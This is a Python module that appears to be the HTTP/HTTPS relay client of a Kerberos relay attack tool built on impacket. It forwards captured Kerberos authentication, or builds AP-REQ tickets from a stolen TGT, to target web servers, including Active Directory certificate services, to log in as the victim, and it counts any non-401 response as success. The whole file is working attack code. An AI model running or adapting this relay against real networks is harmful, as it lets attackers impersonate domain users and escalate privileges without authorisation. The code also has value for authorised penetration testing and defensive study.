import base64
import ssl

try:
    from http.client import HTTPConnection, HTTPSConnection
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection

from impacket import LOG
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS

from lib.protocols.kerberos.krb_relay.clients.base import ProtocolClient
from lib.protocols.kerberos.krb_relay.utils.kerberos_impacket import build_apreq


class HTTPRelayClient(ProtocolClient):
    PLUGIN_NAME = "HTTP"

    def __init__(self, serverConfig, target, targetPort=80, extendedSecurity=True):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.authenticationMethod = None
        self.lastresult = None

    def initConnection(self, authdata, kdc=None):
        self.session = HTTPConnection(self.targetHost, self.targetPort)
        self.path = self.target.path or "/"
        return self.doInitialActions(authdata, kdc)

    def doInitialActions(self, authdata, kdc=None):
        self.session.request("GET", self.path)
        res = self.session.getresponse()
        res.read()
        if res.status != 401:
            LOG.info("Status code returned: %d. Authentication may not be required", res.status)
        try:
            auth_header = res.getheader("WWW-Authenticate") or ""
            if "Kerberos" not in auth_header and "Negotiate" not in auth_header:
                LOG.error("Kerberos auth not offered by URL, offered: %s", auth_header)
                if not self.serverConfig.isADCSAttack:
                    return False
            if "Kerberos" in auth_header:
                self.authenticationMethod = "Kerberos"
            elif "Negotiate" in auth_header:
                self.authenticationMethod = "Negotiate"
        except (KeyError, TypeError):
            LOG.error("No authentication requested by the server for url %s", self.targetHost)
            if not self.serverConfig.isADCSAttack:
                return False

        if self.serverConfig.mode == "RELAY":
            negotiate = base64.b64encode(authdata["krbauth"]).decode("ascii")
        else:
            krbauth = build_apreq(
                authdata["domain"],
                kdc,
                authdata["tgt"],
                authdata["username"],
                "http",
                self.targetHost,
            )
            negotiate = base64.b64encode(krbauth).decode("ascii")

        headers = {"Authorization": "%s %s" % (self.authenticationMethod, negotiate)}
        self.session.request("GET", self.path, headers=headers)
        res = self.session.getresponse()
        res.read()
        if res.status == 401:
            return False
        LOG.info("HTTP server returned status code %d, treating as successful login", res.status)
        self.lastresult = res.read()
        return True

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        self.session.request("HEAD", "/favicon.ico")
        self.session.getresponse()


class HTTPSRelayClient(HTTPRelayClient):
    PLUGIN_NAME = "HTTPS"

    def __init__(self, serverConfig, target, targetPort=443, extendedSecurity=True):
        HTTPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self, authdata, kdc=None):
        self.path = self.target.path or "/"
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost, self.targetPort, context=context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost, self.targetPort)
        return self.doInitialActions(authdata, kdc)
